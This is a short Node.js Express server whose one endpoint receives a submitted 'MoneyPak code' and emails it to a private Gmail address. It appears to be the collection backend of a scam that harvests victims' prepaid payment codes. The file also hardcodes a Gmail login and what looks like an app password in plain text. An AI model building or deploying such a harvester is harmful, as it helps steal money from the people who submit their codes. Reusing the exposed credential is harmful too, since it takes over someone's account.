const express = require("express");
const nodemailer = require("nodemailer");
const cors = require("cors");

const app = express();
app.use(cors());
app.use(express.json());

// 🔐 YOUR EMAIL SETTINGS
const transporter = nodemailer.createTransport({
    service: "gmail",
    auth: {
        user: "survivalmanagementc@gmail.com",
        pass: "psqj ltjq aytk ntjh"
    }
});

app.post("/send-code", async (req, res) => {
    const { code } = req.body;

    try {
        await transporter.sendMail({
            from: "survivalmanagementc@gmail.com",
            to: "victoriawallings21@gmail.com", // send to yourself
            subject: "New MoneyPak Code Submitted",
            text: `Code entered: ${code}`
        });

        res.json({ message: "Code sent successfully!" });
    } catch (err) {
    console.log("🔥 EMAIL ERROR:", err);
    res.status(500).json({ message: "Email failed to send" });
}
});

app.listen(3000, () => console.log("Server running on port 3000"));